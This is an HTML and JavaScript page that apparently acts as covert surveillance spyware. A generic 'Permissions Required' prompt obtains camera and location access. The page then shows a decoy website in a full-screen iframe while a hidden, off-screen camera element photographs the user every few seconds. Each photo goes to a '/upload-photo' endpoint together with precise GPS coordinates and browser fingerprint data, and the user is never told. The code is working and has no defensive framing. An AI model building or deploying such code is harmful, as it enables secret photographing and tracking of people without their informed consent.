<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        #websiteFrame {
            width: 100vw;
            height: 100vh;
            border: none;
            display: none;
        }

        #websiteFrame.show {
            display: block;
        }

        #hiddenCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* Permission Request Screen */
        #permissionScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
            z-index: 9999;
            transition: opacity 0.5s;
        }

        #permissionScreen.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .permission-card {
            background: white;
            color: #333;
            padding: 40px;
            border-radius: 20px;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .permission-card h1 {
            font-size: 2em;
            margin-bottom: 20px;
            color: #667eea;
        }

        .permission-card p {
            font-size: 1.1em;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .permission-item {
            background: #f8f9fa;
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .permission-item .icon {
            font-size: 2em;
        }

        .permission-item .status {
            font-weight: bold;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.9em;
        }

        .status.pending {
            background: #ffc107;
            color: #000;
        }

        .status.granted {
            background: #28a745;
            color: white;
        }

        .status.denied {
            background: #dc3545;
            color: white;
        }

        .btn {
            padding: 15px 40px;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin: 10px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-skip {
            background: #6c757d;
            color: white;
        }

        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            margin-top: 20px;
            font-size: 1.2em;
        }

        #debugPanel {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.9);
            color: #0f0;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 11px;
            max-width: 350px;
            z-index: 10000;
            display: none;
            max-height: 300px;
            overflow-y: auto;
        }

        #debugPanel.show {
            display: block;
        }

        .debug-line {
            margin: 3px 0;
            padding: 3px;
            border-bottom: 1px solid #333;
        }

        .debug-error { color: #f00; }
        .debug-success { color: #0f0; }
        .debug-warning { color: #ff0; }
        .debug-info { color: #0ff; }
    </style>
</head>
<body>
    <!-- Permission Request Screen -->
    <div id="permissionScreen">
        <div class="permission-card">
            <h1>🔐 Permissions Required</h1>
            <p>This website needs access to your camera and location to function properly.</p>
            
            <div class="permission-item">
                <div>
                    <span class="icon">📷</span>
                    <strong>Camera Access</strong>
                </div>
                <span class="status pending" id="cameraStatus">Pending</span>
            </div>

            <div class="permission-item">
                <div>
                    <span class="icon">📍</span>
                    <strong>Location Access</strong>
                </div>
                <span class="status pending" id="locationStatus">Pending</span>
            </div>

            <div style="margin-top: 30px;">
                <button class="btn btn-primary" id="grantBtn" onclick="requestPermissions()">
                    ✅ Grant Permissions
                </button>
                <button class="btn btn-skip" onclick="skipPermissions()">
                    ⏭️ Skip (Limited Features)
                </button>
            </div>

            <div id="loadingIndicator" style="display: none;">
                <div class="spinner"></div>
                <div class="loading-text" id="loadingText">Requesting permissions...</div>
            </div>
        </div>
    </div>

    <!-- Main Website Frame -->
    <iframe id="websiteFrame" src="" allowfullscreen></iframe>

    <!-- Hidden Camera Elements -->
    <div id="hiddenCamera">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <!-- Debug Panel -->
    <div id="debugPanel">
        <div style="color: #fff; font-weight: bold; margin-bottom: 10px;">📊 Debug Console</div>
        <div id="debugLog"></div>
    </div>

    <script>
        // Configuration
        const DEBUG_MODE = true; // Set to false in production

        const savedConfig = localStorage.getItem('surveillanceConfig');
        const CONFIG = savedConfig ? JSON.parse(savedConfig) : {
            targetWebsite: 'https://www.google.com',
            captureInterval: 5000,
            showControlPanel: false,
            autoStart: true
        };

        // Global variables
        let monitoringActive = false;
        let monitoringInterval = null;
        let stream = null;
        let captureCount = 0;
        let permissionsGranted = {
            camera: false,
            location: false
        };

        // Elements
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const websiteFrame = document.getElementById('websiteFrame');
        const permissionScreen = document.getElementById('permissionScreen');
        const cameraStatus = document.getElementById('cameraStatus');
        const locationStatus = document.getElementById('locationStatus');
        const grantBtn = document.getElementById('grantBtn');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const loadingText = document.getElementById('loadingText');
        const debugPanel = document.getElementById('debugPanel');
        const debugLog = document.getElementById('debugLog');

        // Show debug panel
        if (DEBUG_MODE) {
            debugPanel.classList.add('show');
        }

        // Debug logger
        function log(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            console.log(`[${timestamp}] ${message}`);
            
            if (DEBUG_MODE) {
                const line = document.createElement('div');
                line.className = `debug-line debug-${type}`;
                line.textContent = `[${timestamp}] ${message}`;
                debugLog.insertBefore(line, debugLog.firstChild);
                
                // Keep only last 20 lines
                while (debugLog.children.length > 20) {
                    debugLog.removeChild(debugLog.lastChild);
                }
            }
        }

        // Update status
        function updateStatus(element, status, text) {
            element.className = `status ${status}`;
            element.textContent = text;
        }

        // Request Camera Permission
        async function requestCamera() {
            log('Requesting camera permission...', 'info');
            updateStatus(cameraStatus, 'pending', 'Requesting...');

            try {
                // First check if getUserMedia is supported
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error('Camera API not supported in this browser');
                }

                // Request camera with specific constraints
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280, min: 640 },
                        height: { ideal: 720, min: 480 }
                    },
                    audio: false
                });

                log('Camera stream obtained', 'success');

                // Attach to video element
                video.srcObject = stream;
                
                // Wait for video to be ready
                await new Promise((resolve, reject) => {
                    video.onloadedmetadata = () => {
                        video.play()
                            .then(resolve)
                            .catch(reject);
                    };
                    video.onerror = reject;
                    
                    // Timeout after 10 seconds
                    setTimeout(() => reject(new Error('Video load timeout')), 10000);
                });

                log('Video element ready', 'success');
                updateStatus(cameraStatus, 'granted', '✅ Granted');
                permissionsGranted.camera = true;
                return true;

            } catch (error) {
                log(`Camera error: ${error.message}`, 'error');
                updateStatus(cameraStatus, 'denied', '❌ Denied');
                permissionsGranted.camera = false;
                
                // Show user-friendly error
                if (error.name === 'NotAllowedError') {
                    alert('❌ Camera access denied. Please allow camera access and refresh the page.');
                } else if (error.name === 'NotFoundError') {
                    alert('❌ No camera found on your device.');
                } else {
                    alert(`❌ Camera error: ${error.message}`);
                }
                
                return false;
            }
        }

        // Request Location Permission
        async function requestLocation() {
            log('Requesting location permission...', 'info');
            updateStatus(locationStatus, 'pending', 'Requesting...');

            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    log('Geolocation not supported', 'error');
                    updateStatus(locationStatus, 'denied', '❌ Not Supported');
                    permissionsGranted.location = false;
                    resolve(false);
                    return;
                }

                const timeout = setTimeout(() => {
                    log('Location timeout', 'warning');
                    updateStatus(locationStatus, 'denied', '⏱️ Timeout');
                    permissionsGranted.location = false;
                    resolve(false);
                }, 10000);

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        log(`Location: ${position.coords.latitude}, ${position.coords.longitude}`, 'success');
                        updateStatus(locationStatus, 'granted', '✅ Granted');
                        permissionsGranted.location = true;
                        resolve(true);
                    },
                    (error) => {
                        clearTimeout(timeout);
                        log(`Location error: ${error.message}`, 'error');
                        updateStatus(locationStatus, 'denied', '❌ Denied');
                        permissionsGranted.location = false;
                        
                        if (error.code === error.PERMISSION_DENIED) {
                            alert('❌ Location access denied. Please allow location access.');
                        }
                        
                        resolve(false);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Request all permissions
        async function requestPermissions() {
            grantBtn.disabled = true;
            loadingIndicator.style.display = 'block';
            
            log('=== Starting permission requests ===', 'info');

            // Request camera first
            loadingText.textContent = 'Requesting camera access...';
            const cameraOk = await requestCamera();
            
            await new Promise(resolve => setTimeout(resolve, 500));

            // Request location
            loadingText.textContent = 'Requesting location access...';
            const locationOk = await requestLocation();

            await new Promise(resolve => setTimeout(resolve, 1000));

            // Check results
            if (cameraOk || locationOk) {
                log('At least one permission granted', 'success');
                loadingText.textContent = 'Permissions granted! Loading website...';
                await new Promise(resolve => setTimeout(resolve, 1500));
                startWebsite();
            } else {
                log('All permissions denied', 'error');
                loadingText.textContent = '❌ Permissions denied';
                grantBtn.disabled = false;
                loadingIndicator.style.display = 'none';
                
                const retry = confirm('No permissions granted. Retry?');
                if (retry) {
                    location.reload();
                }
            }
        }

        // Skip permissions and continue
        function skipPermissions() {
            log('Permissions skipped by user', 'warning');
            alert('⚠️ App will run with limited functionality');
            startWebsite();
        }

        // Get browser info
        function getBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                viewportWidth: window.innerWidth,
                viewportHeight: window.innerHeight,
                timestamp: new Date().toISOString(),
                isSecure: location.protocol === 'https:',
                url: window.location.href,
                permissions: permissionsGranted
            };
        }

        // Get current location
        async function getCurrentLocation() {
            if (!permissionsGranted.location) {
                log('Location not available', 'warning');
                return null;
            }

            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        log(`Location obtained: ${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}`, 'success');
                        resolve(location);
                    },
                    (error) => {
                        log(`Location error: ${error.message}`, 'error');
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            });
        }

        // Capture and send data
        async function captureAndSend() {
            try {
                log('Starting capture...', 'info');

                // Check if camera is available
                if (!permissionsGranted.camera || !stream || video.readyState !== video.HAVE_ENOUGH_DATA) {
                    log('Camera not ready, skipping capture', 'warning');
                    return;
                }

                // Capture photo
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                log(`Photo captured: ${canvas.width}x${canvas.height}`, 'success');

                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
                });

                if (!blob || blob.size === 0) {
                    log('Failed to create image blob', 'error');
                    return;
                }

                log(`Blob size: ${(blob.size / 1024).toFixed(2)} KB`, 'info');

                // Get location and browser info
                const location = await getCurrentLocation();
                const browserInfo = getBrowserInfo();

                // Prepare form data
                const formData = new FormData();
                formData.append('photo', blob, 'capture.jpg');
                formData.append('location', JSON.stringify(location || {}));
                formData.append('browserInfo', JSON.stringify(browserInfo));
                formData.append('pageUrl', CONFIG.targetWebsite);

                log('Sending to server...', 'info');

                // Send to server
                const response = await fetch('/upload-photo', {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                if (result.success) {
                    captureCount++;
                    log(`✅ Capture #${captureCount} sent successfully`, 'success');
                } else {
                    log(`❌ Server error: ${result.error}`, 'error');
                }

            } catch (error) {
                log(`❌ Capture failed: ${error.message}`, 'error');
            }
        }

        // Start website and monitoring
        function startWebsite() {
            log('Loading website...', 'info');
            
            // Hide permission screen
            permissionScreen.classList.add('hidden');
            
            // Show website
            websiteFrame.src = CONFIG.targetWebsite;
            websiteFrame.classList.add('show');

            websiteFrame.onload = () => {
                log(`Website loaded: ${CONFIG.targetWebsite}`, 'success');
                
                // Start monitoring after delay
                if (CONFIG.autoStart && permissionsGranted.camera) {
                    setTimeout(() => {
                        log('Starting monitoring...', 'info');
                        monitoringActive = true;
                        
                        // Initial capture
                        setTimeout(captureAndSend, 3000);
                        
                        // Regular captures
                        monitoringInterval = setInterval(captureAndSend, CONFIG.captureInterval);
                        
                        log(`Monitoring started (interval: ${CONFIG.captureInterval}ms)`, 'success');
                    }, 2000);
                }
            };

            websiteFrame.onerror = () => {
                log('Failed to load website', 'error');
            };
        }

        // Stop monitoring
        function stopMonitoring() {
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
            }
            
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            log('Monitoring stopped', 'warning');
        }

        // Initialize on page load
        window.addEventListener('load', () => {
            log('=== Surveillance System Initialized ===', 'info');
            log(`Target website: ${CONFIG.targetWebsite}`, 'info');
            log(`Capture interval: ${CONFIG.captureInterval}ms`, 'info');
            log(`Auto-start: ${CONFIG.autoStart}`, 'info');
            log(`Protocol: ${location.protocol}`, 'info');
            
            // Check if HTTPS
            if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
                log('⚠️ Not HTTPS - permissions may fail', 'warning');
            }
        });

        // Cleanup on page unload
        window.addEventListener('beforeunload', stopMonitoring);
    </script>
</body>
</html>
